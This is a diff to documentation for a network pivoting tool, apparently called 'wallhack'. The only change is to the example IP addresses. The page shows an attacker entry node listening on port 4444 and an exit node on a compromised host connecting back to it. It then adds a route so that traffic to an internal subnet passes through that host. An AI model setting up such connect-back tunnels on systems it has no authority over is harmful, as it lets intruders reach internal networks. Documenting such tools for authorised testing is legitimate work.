@@ -6,14 +6,14 @@ order: 7
 
 # Single Hop Example
 
-In this example, an entry node runs on the attacker machine (`10.0.0.5`) and a compromised host (`10.0.1.5`) connects back to it. Once established, traffic to `192.168.1.0/24` routes through the compromised host.
+In this example, an entry node runs on the attacker machine (`192.168.1.5`) and a compromised host (`10.0.1.5`) connects back to it. Once established, traffic to `10.10.0.0/24` routes through the compromised host.
 
 The binary reached the host via initial access — a web shell, RCE exploit, or similar foothold. Once transferred and marked executable, the exit node can be started.
 
-{% trafficflow flow="10.0.0.5 (entry) -> 10.0.1.5 (compromised) -> 192.168.1.0/24 (target)" label="Traffic Flow:" /%}
+{% trafficflow flow="192.168.1.5 (entry) -> 10.0.1.5 (compromised) -> 10.10.0.0/24 (target)" label="Traffic Flow:" /%}
 
 {% steps %}
-{% step title="Attacker (10.0.0.5)" number=1 %}
+{% step title="Attacker (192.168.1.5)" number=1 %}
 An [entry node](/concepts) listening for incoming connections. The default transport is QUIC (UDP).
 
 {% codeblock code="wallhack entry --listen :4444" /%}
@@ -22,14 +22,14 @@ An [entry node](/concepts) listening for incoming connections. The default trans
 {% step title="Compromised Host (10.0.1.5)" number=2 %}
 An [exit node](/concepts) connecting back to the entry node.
 
-{% codeblock code="wallhack exit --connect 10.0.0.5:4444" /%}
+{% codeblock code="wallhack exit --connect 192.168.1.5:4444" /%}
 {% /step %}
 
 {% step title="Configure Routes" number=3 %}
 Add routes for the networks accessible through the compromised host.
 
 ```bash
-ip route add 192.168.1.0/24 dev tun0
+ip route add 10.10.0.0/24 dev tun0
 ```
 {% /step %}
 {% /steps %}
